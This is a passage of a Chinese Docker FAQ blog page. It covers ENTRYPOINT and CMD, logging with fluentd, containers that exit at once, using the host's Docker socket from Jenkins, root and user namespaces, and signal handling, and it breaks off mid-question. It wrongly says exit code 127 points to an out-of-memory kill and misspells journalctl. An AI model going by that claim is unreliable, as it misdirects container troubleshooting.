href="#问：ENTRYPOINT-和-CMD-到底有什么不同？" class="headerlink" title="问：ENTRYPOINT 和 CMD 到底有什么不同？"></a>问：ENTRYPOINT 和 CMD 到底有什么不同？</h2><p><strong>答：</strong> <code>Dockerfile</code> 的目的是制作镜像，换句话说，实际上是准备的是主进程运行环境。那么准备好后，需要执行一个程序才可以启动主进程，而启动的办法就是调用 <code>ENTRYPOINT</code>，并且把 <code>CMD</code> 作为参数传进去运行。也就是下面的概念：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ENTRYPOINT <span class="string">"CMD"</span></span><br></pre></td></tr></table></figure><p>假设有个 <code>myubuntu</code> 镜像 <code>ENTRYPOINT</code> 是 <code>sh -c</code>，而我们 <code>docker run -it myubuntu uname -a</code>。那么 <code>uname -a</code>就是运行时指定的 <code>CMD</code>，那么 Docker 实际运行的就是结合起来的结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"uname -a"</span></span><br></pre></td></tr></table></figure><ul><li><p>如果没有指定 <code>ENTRYPOINT</code>，那么就只执行 <code>CMD</code>；</p></li><li><p>如果指定了 <code>ENTRYPOINT</code> 而没有指定 <code>CMD</code>，自然执行 <code>ENTRYPOINT</code>;</p></li><li><p>如果 <code>ENTRYPOINT</code> 和 <code>CMD</code> 都指定了，那么就如同上面所述，执行 <code>ENTRYPOINT &quot;CMD&quot;</code>；</p></li><li><p>如果没有指定 <code>ENTRYPOINT</code>，而 <code>CMD</code> 用的是上述那种 <code>shell</code> 命令的形式，则自动使用 <code>sh -c</code> 作为 <code>ENTRYPOINT</code>。</p></li></ul><p>注意最后一点的区别，这个区别导致了同样的命令放到 <code>CMD</code> 和 <code>ENTRYPOINT</code> 下效果不同，因此有可能放在 <code>ENTRYPOINT</code> 下的同样的命令，由于需要 <code>tty</code> 而运行时忘记了给（比如忘记了<code>docker-compose.yml</code> 的 <code>tty:true</code>）导致运行失败。</p><p>这种用法可以很灵活，比如我们做个 <code>git</code> 镜像，可以把 <code>git</code> 命令指定为 <code>ENTRYPOINT</code>，这样我们在 <code>docker run</code> 的时候，直接跟子命令即可。比如 <code>docker run git log</code>就是显示日志。</p><h2 id="问：拿到一个镜像，如何获得镜像的-Dockerfile-？"><a href="#问：拿到一个镜像，如何获得镜像的-Dockerfile-？" class="headerlink" title="问：拿到一个镜像，如何获得镜像的 Dockerfile ？"></a>问：拿到一个镜像，如何获得镜像的 Dockerfile ？</h2><p><strong>答：</strong></p><ul><li><p>直接去 <code>Docker Hub</code> 上看：大多数 <code>Docker Hub</code>上的镜像都会有 <code>Dockerfile</code>，直接在 <code>Docker Hub</code> 的镜像页面就可以看到 <code>Dockerfile</code> 的链接；</p></li><li><p>如果没有 <code>Dockerfile</code>，一般这类镜像就不应该考虑使用了，这类黑箱似的镜像很容有有问题。如果是什么特殊原因，那继续往下看；</p></li><li><p><code>docker history</code> 可以看到镜像每一层的信息，包括命令，当然黑箱镜像的 <code>commit</code> 看不见操作；</p></li><li><p><code>docker inspect</code> 可以分析镜像很多细节。</p></li><li><p>直接运行镜像，进入<code>shell</code>，然后根据上面的分析结果去进一步分析日志、文件内容及变化。</p></li></ul><h2 id="问：Docker-日志都在哪里？"><a href="#问：Docker-日志都在哪里？" class="headerlink" title="问：Docker 日志都在哪里？"></a>问：Docker 日志都在哪里？</h2><p>日志分两类，一类是 <code>Docker 引擎日志</code>；另一类是 <code>容器日志</code>。</p><p><strong>Docker 引擎日志</strong></p><p>Docker 引擎日志 一般是交给了 <code>Upstart(Ubuntu 14.04)</code>或者 <code>systemd (CentOS 7, Ubuntu 16.04)</code>。前者一般位于 <code>/var/log/upstart/docker.log</code> 下，后者一般通过 <code>jounarlctl -u docker</code>来读取或系统日志里面<code>/var/log/messages</code> 。</p><p><strong>容器日志</strong></p><p>容器的日志 则可以通过 <code>docker logs</code> 命令来访问，而且可以像 <code>tail -f</code> 一样，使用 <code>docker logs -f</code> 来实时查看。如果使用 <code>Docker Compose</code>，则可以通过 <code>docker-compose logs &lt;服务名&gt;</code>来查看。</p><p>如果深究其日志位置，每个容器的日志默认都会以 <code>json-file</code> 的格式存储于<code>/var/lib/docker/containers/&lt;容器id&gt;/&lt;容器id&gt;-json.log</code>下，不过并不建议去这里直接读取内容，因为 Docker 提供了更完善地日志收集方式 - Docker 日志收集驱动。</p><p>关于日志收集，Docker 内置了很多日志驱动，可以通过类似于<code>fluentd</code>, <code>syslog</code> 这类服务收集日志。无论是 Docker 引擎，还是容器，都可以使用日志驱动。比如，如果打算用 <code>fluentd</code> 收集某个容器日志，可以这样启动容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -d \</span><br><span class="line">    --<span class="built_in">log</span>-driver=fluentd \</span><br><span class="line">    --<span class="built_in">log</span>-opt fluentd-address=10.2.3.4:24224 \</span><br><span class="line">    --<span class="built_in">log</span>-opt tag=<span class="string">"docker.&#123;&#123;.Name&#125;&#125;"</span> \</span><br><span class="line">    nginx</span><br></pre></td></tr></table></figure><p>其中 <code>10.2.3.4:24224</code> 是 <code>fluentd</code> 服务地址，实际环境中应该换成真实的地址。</p><h2 id="问：不同容器的日志汇聚到-fluentd-后如何区分？"><a href="#问：不同容器的日志汇聚到-fluentd-后如何区分？" class="headerlink" title="问：不同容器的日志汇聚到 fluentd 后如何区分？"></a>问：不同容器的日志汇聚到 fluentd 后如何区分？</h2><p><strong>答：</strong> 有两种概念的区分，一种是区分开不同容器的日志，另一种是区分开来不同服务的日志。</p><p>区分不同容器的日志是很直观的想法。运行了几个不同的容器，日志都送向日志收集，那么显然不希望<code>nginx</code>容器的日志和 <code>MySQL</code> 容器的日志混杂在一起看。</p><p>但是在<code>Swarm</code> 集群环境中，区分容器就已经不再是合理的做法了。因为同一个服务可能有许多副本，而又有很多个服务，如果一个个的容器区分去分析，很难看到一个整体上某个服务的服务状态是什么样子的。而且，容器是短生存周期的，在维护期间容器生存死亡是很常见的事情。如果是像传统虚拟机那样子以容器为单元去分析日志，其结果很难具有价值。因此更多的时候是对某一个服务的日志整体分析，无需区别日志具体来自于哪个容器，不需要关心容器是什么时间产生以及是否消亡，只需要以服务为单元去区分日志即可。</p><p>这两类的区分日志的办法，Docker 都可以做到，这里我们以 <code>fluentd</code> 为例说明。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">version: <span class="string">'2'</span></span><br><span class="line">services:</span><br><span class="line">    web:</span><br><span class="line">        image: nginx:1.11-alpine</span><br><span class="line">        ports:</span><br><span class="line">            - <span class="string">"3000:80"</span></span><br><span class="line">        labels:</span><br><span class="line">            section: frontend</span><br><span class="line">            group: alpha</span><br><span class="line">            service: web</span><br><span class="line">            image: nginx</span><br><span class="line">            base_os: alpine</span><br><span class="line">        logging:</span><br><span class="line">            driver: fluentd</span><br><span class="line">            options:</span><br><span class="line">                fluentd-address: <span class="string">"localhost:24224"</span></span><br><span class="line">                tag: <span class="string">"frontend.web.nginx.&#123;&#123;.Name&#125;&#125;"</span></span><br><span class="line">                labels: <span class="string">"section,group,service,image,base_os"</span></span><br></pre></td></tr></table></figure><p>这里我们运行了一个 <code>nginx:alpine</code> 的容器，服务名为 <code>web</code>。容器的日志使用 <code>fluentd</code> 进行收集，并且附上标签 <code>frontend.web.nginx.&lt;容器名&gt;</code>。除此以外，我们还定义了一组 <code>labels</code>，并且在 <code>logging</code> 的 <code>options</code> 中的 <code>labels</code>中指明希望哪些标签随日志记录。这些信息中很多一部分都会出现在所收集的日志里。</p><p>让我们来看一下 <code>fluentd</code>收到的信息什么样子的。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">"frontend.web.nginx.service_web_1"</span>: &#123;</span><br><span class="line">    <span class="string">"image"</span>: <span class="string">"nginx"</span>,</span><br><span class="line">    <span class="string">"base_os"</span>: <span class="string">"alpine"</span>,</span><br><span class="line">    <span class="string">"container_id"</span>: <span class="string">"f7212f7108de033045ddc22858569d0ac50921b043b97a2c8bf83b1b1ee50e34"</span>,</span><br><span class="line">    <span class="string">"section"</span>: <span class="string">"frontend"</span>,</span><br><span class="line">    <span class="string">"service"</span>: <span class="string">"web"</span>,</span><br><span class="line">    <span class="string">"log"</span>: <span class="string">"172.20.0.1 - - [09/Dec/2016:15:02:45 +0000] \"GET / HTTP/1.1\" 200 612 \"-\" \"curl/7.49.1\" \"-\""</span>,</span><br><span class="line">    <span class="string">"group"</span>: <span class="string">"alpha"</span>,</span><br><span class="line">    <span class="string">"container_name"</span>: <span class="string">"/service_web_1"</span>,</span><br><span class="line">    <span class="string">"source"</span>: <span class="string">"stdout"</span>,</span><br><span class="line">    <span class="string">"remote"</span>: <span class="string">"172.20.0.1"</span>,</span><br><span class="line">    <span class="string">"host"</span>: <span class="string">"-"</span>,</span><br><span class="line">    <span class="string">"user"</span>: <span class="string">"-"</span>,</span><br><span class="line">    <span class="string">"method"</span>: <span class="string">"GET"</span>,</span><br><span class="line">    <span class="string">"path"</span>: <span class="string">"/"</span>,</span><br><span class="line">    <span class="string">"code"</span>: <span class="string">"200"</span>,</span><br><span class="line">    <span class="string">"size"</span>: <span class="string">"612"</span>,</span><br><span class="line">    <span class="string">"referer"</span>: <span class="string">"-"</span>,</span><br><span class="line">    <span class="string">"agent"</span>: <span class="string">"curl/7.49.1"</span>,</span><br><span class="line">    <span class="string">"forward"</span>: <span class="string">"-"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果去除<code>nginx</code> 正常的访问日志项目外，我们就可以更清晰的看到有哪些元数据信息可以利用了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  <span class="string">"frontend.web.nginx.service_web_1"</span>: &#123;</span><br><span class="line">    <span class="string">"image"</span>: <span class="string">"nginx"</span>,</span><br><span class="line">    <span class="string">"base_os"</span>: <span class="string">"alpine"</span>,</span><br><span class="line">    <span class="string">"container_id"</span>: <span class="string">"f7212f7108de033045ddc22858569d0ac50921b043b97a2c8bf83b1b1ee50e34"</span>,</span><br><span class="line">    <span class="string">"section"</span>: <span class="string">"frontend"</span>,</span><br><span class="line">    <span class="string">"service"</span>: <span class="string">"web"</span>,</span><br><span class="line">    <span class="string">"group"</span>: <span class="string">"alpha"</span>,</span><br><span class="line">    <span class="string">"container_name"</span>: <span class="string">"/service_web_1"</span>,</span><br><span class="line">    <span class="string">"source"</span>: <span class="string">"stdout"</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，我们在 <code>logging</code> 下所有指定的 <code>labels</code> 都在。我们完全可以对每个服务设定不同的标签，通过标签来区分服务。<br>比如这里，我们对 <code>web</code> 服务指定了 <code>service=web</code> 的标签，我们同样可以对数据库的服务设定标签为 <code>service=mysql</code>，这样在汇总后，只需要对 <code>service</code> 标签分组过滤即可，分离聚合不同服务的日志。</p><p>此外，我们可以设置不止一个标签，比如上面的例子，我们设置了多组不同颗粒度的标签，在后期分组的时候，可以很灵活的进行组合，以满足不同需求。</p><p>此外，注意 <code>frontend.web.nginx.service_web_1</code>，这是我们之前利用 <code>--log-opt tag=frontend.web.nginx.&lt;容器名&gt;</code> 进行设定的，其中&lt;容器名&gt; 我们使用的是 Go 模板表达式。Go 模板很强大，我们可以用它实现非常复杂的标签。在 <code>fluentd</code> 中，<code>&lt;match&gt;</code>项可以根据标签来进行筛选。</p><p>这里可以唯一表示容器的，有容器 <code>ID container_id</code>，而容器名<code>container_name</code> 也从某种程度上可以用来区分不同容器。因此进行容器区分日志的时候，可以使用这两项。</p><p>还有一个 <code>source</code>，这表示了日志是从标准输出还是标准错误输出得到的，由此可以区分正常日志和错误日志。</p><p>现在我们可以知道，除了容器自身输出的信息外，Docker 还可以为每一个容器的日志添加很多元数据，以帮助后期的日志处理中应对不同需求的搜索和过滤。</p><p>在后期处理中，<code>fluentd</code>中可以利用<code>&lt;match&gt;</code> 或者 <code>&lt;filter&gt;</code> 插件根据 <code>tag</code> 或者其它元数据进行分别处理。而日志到了 <code>ElasticSearch</code>这类系统后，则可以用更丰富的查询语言进行过滤、聚合。</p><h2 id="问：为什么容器一运行就退出啊？"><a href="#问：为什么容器一运行就退出啊？" class="headerlink" title="问：为什么容器一运行就退出啊？"></a>问：为什么容器一运行就退出啊？</h2><p><strong>答：</strong> 这是初学 Docker 常常碰到的问题，此时还以虚拟机来理解 Docker，认为启动 Docker 就是启动虚拟机，也没有搞明白前台和后台的区别。</p><p>首先，碰到这类问题应该查日志和容器主进程退出码。</p><p>检查容器日志：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker logs &lt;容器ID&gt;</span><br></pre></td></tr></table></figure><p>查看容器退出码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONTAINER ID        IMAGE                           COMMAND             CREATED             STATUS                      PORTS                                                                  NAMES</span><br><span class="line">cc2aa3f4745f        ubuntu                          <span class="string">"/bin/bash"</span>         23 hours ago        Exited (0) 22 hours ago                                                                            clever_lewin</span><br><span class="line">25510a2cb171        twang2218/gitlab-ce-zh:8.15.3   <span class="string">"/assets/wrapper"</span>   2 days ago          Exited (127) 2 days ago</span><br></pre></td></tr></table></figure><p>在 <code>STATUS</code> 一栏中，可以看到退出码是多少。</p><ul><li><p>如果看到了 <code>Exited (127)</code> 那很可能是由于内存超标导致触发 <code>Out Of Memory</code> 然后被强制终止了。</p></li><li><p>如果看到了 <code>Exited (0)</code>，这说明容器主进程正常退出了。</p></li><li><p>如果是其他情况，应该检查容器日志。</p></li></ul><p>初学 Docker 的人常常会不理解既然正常怎么会退出的意思。不得不在强调一遍，Docker 不是虚拟机，容器只是进程。因此当执行 <code>docker run</code>的时候，实际所做的只是启动一个进程，如果进程退出了，那么容器自然就终止了。</p><p>那么进程为什么会退出？</p><ul><li><p>如果是执行 <code>service nginx start</code> 这类启动后台服务程序的命令，那说明还是把 Docker 当做虚拟机了。Docker 启动的是进程，因此所谓的后台服务应该放到前台，比如应该 <code>nginx -g &#39;daemon off;&#39;</code>这样直接前台启动应用才对。</p></li><li><p>如果发现 <code>COMMAND</code> 一栏是 <code>/bin/bash</code>，那还是说明把 Docker 当虚拟机了。<code>COMMAND</code>应该是应用程序，而不交互式操作界面，容器不需要交互式操作界面。此外，如果使用 <code>/bin/bash</code> 希望起一个交互式的界面，那么也必须提供给其输入和终端，因此必须加 <code>-it</code> 选项，比如 <code>docker run -it ubuntu /bin/bash</code></p></li></ul><h2 id="问：我想在docker容器里面运行docker命令，该如何操作？"><a href="#问：我想在docker容器里面运行docker命令，该如何操作？" class="headerlink" title="问：我想在docker容器里面运行docker命令，该如何操作？"></a>问：我想在docker容器里面运行docker命令，该如何操作？</h2><p><strong>答：</strong> 首先，不要在 Docker 容器中安装、运行 Docker 引擎，也就是所谓的 <code>Docker In Docker (DIND)</code></p><p>因为Docker-in-Docker有很多问题和缺陷，参考文章：</p><ul><li><a href="https://jpetazzo.github.io/2015/09/03/do-not-use-docker-in-docker-for-ci/" target="_blank" rel="noopener">https://jpetazzo.github.io/2015/09/03/do-not-use-docker-in-docker-for-ci/</a></li></ul><p>为了让容器内可以构建镜像，应该使用 <code>Docker Remote API</code> 的客户端来直接调用宿主的 <code>Docker Engine</code>。可以是原生的 <code>Docker CLI （docker 命令）</code>，也可以是其它语言的库。</p><p>为 <code>Jenkins</code> 添加 Docker 命令行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">FROM jenkins:alpine</span><br><span class="line"><span class="comment"># 下载安装Docker CLI</span></span><br><span class="line">USER root</span><br><span class="line">RUN curl -O https://get.docker.com/builds/Linux/x86_64/docker-latest.tgz \</span><br><span class="line">    &amp;&amp; tar zxvf docker-latest.tgz \</span><br><span class="line">    &amp;&amp; cp docker/docker /usr/<span class="built_in">local</span>/bin/ \</span><br><span class="line">    &amp;&amp; rm -rf docker docker-latest.tgz</span><br><span class="line"><span class="comment"># 将 `jenkins` 用户的组 ID 改为宿主 `docker` 组的组ID，从而具有执行 `docker` 命令的权限。</span></span><br><span class="line">ARG DOCKER_GID=999</span><br><span class="line">USER jenkins:<span class="variable">$&#123;DOCKER_GID&#125;</span></span><br></pre></td></tr></table></figure><p>在这个例子里，我们下载了静态编译的 <code>docker</code> 可执行文件，并提取命令行安装到系统目录下。然后调整了 <code>jenkins</code> 用户的组 <code>ID</code>，调整为宿主 <code>docker</code>组<code>ID</code>，从而使其具有执行 <code>docker</code> 命令的权限。</p><p>组 <code>ID</code> 使用了 <code>DOCKER_GID</code> 参数来定义，以方便进一步定制。构建时可以通过 <code>--build-arg</code>来改变 <code>DOCKER_GID</code> 的默认值，运行时也可以通过 <code>--user jenkins:1234</code> 来改变运行用户的身份。</p><p>用下面的命令来构建镜像（假设镜像名为 <code>jenkins-docker</code>）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t jenkins-docker .</span><br></pre></td></tr></table></figure><p>如果需要构建时调整 <code>docker</code> 组 <code>ID</code>，可以使用 <code>--build-arg</code> 来覆盖参数默认值：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ docker build -t jenkins-docker --build-arg DOCKER_GID=1234 .</span><br></pre></td></tr></table></figure><p>在启动容器的时候，将宿主的 <code>/var/run/docker.sock</code> 文件挂载到容器内的同样位置，从而让容器内可以通过 <code>unix socket</code> 调用宿主的 Docker 引擎。</p><p>比如，可以用下面的命令启动 <code>jenkins</code>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker run --name jenkins \</span><br><span class="line">    -d \</span><br><span class="line">    -p 8080:8080 \</span><br><span class="line">    -v /var/run/docker.sock:/var/run/docker.sock \</span><br><span class="line">    jenkins-docker</span><br></pre></td></tr></table></figure><p>在 <code>jenkins</code> 容器中，就已经可以执行 <code>docker</code> 命令了，可以通过 <code>docker exec</code>来验证这个结果：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ docker <span class="built_in">exec</span> -it jenkins sh</span><br><span class="line">/ $ id</span><br><span class="line">uid=1000(jenkins) gid=999(ping) groups=999(ping)</span><br><span class="line">/ $ docker version</span><br><span class="line">Client:</span><br><span class="line"> Version:      1.12.3</span><br><span class="line"> API version:  1.24</span><br><span class="line"> Go version:   go1.6.3</span><br><span class="line"> Git commit:   6b644ec</span><br><span class="line"> Built:        Wed Oct 26 23:26:11 2016</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line">Server:</span><br><span class="line"> Version:      1.13.0-rc2</span><br><span class="line"> API version:  1.25</span><br><span class="line"> Go version:   go1.7.3</span><br><span class="line"> Git commit:   1f9b3ef</span><br><span class="line"> Built:        Wed Nov 23 06:32:39 2016</span><br><span class="line"> OS/Arch:      linux/amd64</span><br><span class="line">/ $</span><br></pre></td></tr></table></figure><h2 id="问：都说不要用-root-去运行服务，但我看到的-Dockerfile-都是用-root-去运行，这不安全吧？"><a href="#问：都说不要用-root-去运行服务，但我看到的-Dockerfile-都是用-root-去运行，这不安全吧？" class="headerlink" title="问：都说不要用 root 去运行服务，但我看到的 Dockerfile 都是用 root 去运行，这不安全吧？"></a>问：都说不要用 root 去运行服务，但我看到的 Dockerfile 都是用 root 去运行，这不安全吧？</h2><p><strong>答：</strong> 并非所有官方镜像的 <code>Dockerfile</code> 都是用 <code>root</code> 用户去执行的。比如<code>mysql</code> 镜像的执行身份就是 <code>mysql</code> 用户；<code>redis</code> 镜像的服务运行用户就是 <code>redis</code>；<code>mongo</code>镜像内的服务执行身份是 <code>mongo</code> 用户；<code>jenkins</code> 镜像内是 <code>jenkins</code> 用户启动服务等等。所以说 <code>“都是用 root 去运行”</code> 是不客观的。</p><p>当然，这并不是说在容器内使用 <code>root</code> 就非常危险。容器内的 <code>root</code> 和宿主上的 <code>root</code> 不同，容器内的 <code>root</code> 虽然 <code>uid</code> 也默认为 <code>0</code>，但是却处于一个隔离的命名空间，而且被去掉了大量的特权。容器内的 <code>root</code> 是一个没有什么特权的用户，危险的操作基本都无法执行。</p><p>不过，如果用户可以打破这个安全保护，那就是另外一回事了。比如，如果用户挂载了宿主目录给容器，这就是打通了一个容器内的 <code>root</code>操控宿主的一个通道，使得容器内的 <code>root</code> 可以修改所挂载的目录下的任何文件。</p><p>因为当前版本的 Docker 中，默认情况下容器的 <code>user namespace</code> 并未开启，所以容器内的用户和宿主用户共享 <code>uid</code> 空间。容器内的 <code>uid</code> 为 <code>0</code>的 <code>root</code>，就被系统视为 <code>uid=0</code> 的宿主 <code>root</code>，因此磁盘读写时，具有宿主<code>root</code> 同等读写权限。这也是为什么一般不推荐挂载宿主目录、特别是挂载宿主系统目录的原因之一。这一切只要定制镜像的时候，容器内不使用<code>root</code> 启动服务就没这个问题了。</p><p>当然，上面说的问题只是默认情况下 <code>user namespace</code>不会启用的问题。<code>dockerd</code> 有一个 <code>--userns-remap</code> 参数，只要配置了这个参数，就可以确保容器内的 <code>uid</code> 是独立命名空间，容器内的 <code>uid</code>变到宿主的时候，会被<code>remap</code> 到另一个范围。因此，容器内的 <code>uid=0</code> 的 <code>root</code> 将完全跟 <code>root</code>没有任何关系，仅仅是个普通用户而已。</p><p>相关信息请参考官方文档：</p><ul><li><code>--userns-remap</code> 的介绍：<a href="https://docs.docker.com/engine/reference/commandline/dockerd/#/daemon-user-namespace-options" target="_blank" rel="noopener">https://docs.docker.com/engine/reference/commandline/dockerd/#/daemon-user-namespace-options</a></li></ul><ul><li>Docker 安全：<a href="https://docs.docker.com/engine/security/security/" target="_blank" rel="noopener">https://docs.docker.com/engine/security/security/</a></li></ul><h2 id="问：我在容器里运行-systemctl-start-xxx-怎么报错啊？"><a href="#问：我在容器里运行-systemctl-start-xxx-怎么报错啊？" class="headerlink" title="问：我在容器里运行 systemctl start xxx 怎么报错啊？"></a>问：我在容器里运行 systemctl start xxx 怎么报错啊？</h2><p><strong>答：</strong> 如果在容器内使用 <code>systemctl</code> 命令，经常会发现碰到这样的错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failed to get D-Bus connection: Operation not permitted</span><br></pre></td></tr></table></figure><p>这很正常，因为 <code>systemd</code> 是完整系统的服务启动、维护的系统服务程序，而且需要特权去执行。但是容器不是完整系统，既没有配合的服务，也没有特权，所以自然用不了。</p><p>如果你碰到这样的问题，只能再次提醒你，Docker 不是虚拟机。试图在容器里执行 <code>systemctl</code> 命令的，大多都是还没有搞明白容器和虚拟机的区别，因为看到了可以有 <code>Shell</code>，就以为这是个虚拟机，试图重复自己在完整系统上的体验。这是用法错误，不要把 Docker 当做虚拟机去用，容器有自己的用法。</p><p><strong>Docker 不是虚拟机，容器只是受限进程。</strong></p><p>容器内根本不需要后台服务，也不需要服务调度和维护，自然也不需要 <code>systemd</code>。容器只有一个主进程，也就是应用进程。容器的生存周期就是围绕着这个主进程而存在的，所以所试图启动的后台服务，应该改为直接在前台运行，根本不需要也不应该使用 <code>systemctl</code> 命令去在后台加载。日志之类的也是直接从 <code>stdout/stderr</code> 输出，而不是走 <code>journald</code>。</p><h2 id="问：容器内的时间和宿主不一致，如何处理？"><a href="#问：容器内的时间和宿主不一致，如何处理？" class="headerlink" title="问：容器内的时间和宿主不一致，如何处理？"></a>问：容器内的时间和宿主不一致，如何处理？</h2><p><strong>答：</strong> 一般情况直接设置环境变量 <code>TZ</code> 就够了，比如：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker run -it -e TZ=Asia/Shanghai debian bash</span><br><span class="line">root@8e6d6c588328:/<span class="comment"># date</span></span><br><span class="line">Tue Dec 13 09:41:21 CST 2016</span><br></pre></td></tr></table></figure><p>看到了么？时区调整到了 <code>CST</code>，也就是 <code>China Standard Time - 中国标准时间</code> ，因此显示就正常了。</p><p>还有一种方法在构建镜像的时侯调整下时区：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FROM centos:7</span><br><span class="line">RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai  /etc/localtime</span><br></pre></td></tr></table></figure><h2 id="问：我想让我的程序平滑退出，为什么截获-SIGTERM-信号不管用啊？"><a href="#问：我想让我的程序平滑退出，为什么截获-SIGTERM-信号不管用啊？" class="headerlink" title="问：我想让我的程序平滑退出，为什么截获 SIGTERM 信号不管用啊？"></a>问：我想让我的程序平滑退出，为什么截获 SIGTERM 信号不管用啊？</h2><p><strong>答：</strong> <code>docker stop</code>, <code>docker service rm</code> 在停止容器时，都会先发 <code>SIGTERM</code> 信号，等待一段时间<code>（默认为 10 秒）</code>后，如果程序没响应，则强行 <code>SIGKILL</code>杀掉进程。</p><p>这样应用进程就有机会平滑退出，在接收到<code>SIGTERM</code> 后，可以去 Flush 缓存、完成文件读写、关闭数据库连接、释放文件资源、释放锁等等，然后再退出。所以试图截获 SIGTERM 信号的做法是对的。</p><p>但是，可能在截获 <code>SIGTERM</code> 时却发现，却发现应用并没有收到 <code>SIGTERM</code>，于是盲目的认为 Docker 不支持平滑退出，其实并非如此。</p><p>还记得我们提到过，Docker 不是虚拟机，容器只是受限进程，而一个容器只应该跑一个主进程的说法么？如果你发现你的程序没有截获到 <code>SIGTERM</code>，那就很可能你没有遵循这个最佳实践的做法。因为<code>SIGTERM</code>只会发给主进程，也就是容器内 <code>PID</code>为<code>1</code> 的进程。</p><p>至于说主进程启动的那些子进程，完全看主进程是否愿意转发 <code>SIGTERM</code> 给子进程了。所以那些把 Docker 当做虚拟机用的，主进程跑了个<code>bash</code>，然后 <code>exec</code>进去启动程序的，或者来个 <code>&amp;</code> 让程序跑后台的情况，应用进程必然无法收到 <code>SIGTERM</code>。</p><p>还有一种可能是在 Dockerfile 中的 <code>CMD</code> 那行用的是 <code>shell</code> 格式写的命令，而不是 <code>exec</code>格式。还记得前面提到过的 <code>shell</code> 格式的命令，会加一个 <code>sh -c</code> 来去执行么？因此使用 <code>shell</code> 格式写 <code>CMD</code> 的时候，<code>PID</code> 为 <code>1</code> 的进程是 <code>sh</code>，而它不转发信号，所以主程序收不到。</p><p>明白了道理，解决方法就很简单，换成 <code>exec</code> 格式，并且将主进程执行文件放在第一位即可。这也是为什么之前推荐 <code>exec</code> 格式的原因之一。</p><p>进程管理在Docker容器中和在完整的操作系统有一些不同之处。在每个容器的<code>PID1</code>进程，需要能够正确的处理<code>SIGTERM</code>信号来支持容器应用的优雅退出，同时要能正确的处理孤儿进程和僵尸进程。必要的时候使用Docker新提供的 <code>docker run --init</code> 参数可以解决相应问题。</p><h2 id="问：Docker-Swarm（一代swarm）-和Swarm-mode（二代swarm）两者的区别是什么？"><a href="#问：Docker-Swarm（一代swarm）-和Swarm-mode（二代swarm）两者的区别是什么？" class="headerlink" title="问：Docker Swarm（一代swarm） 和Swarm mode（二代swarm）两者的区别是什么？"></a>问：Docker Swarm（一代swarm） 和Swarm mode（二代swarm）两者的区别是什么？</h2><p><strong>答：</strong> 因为 <code>docker run</code> 和 <code>docker 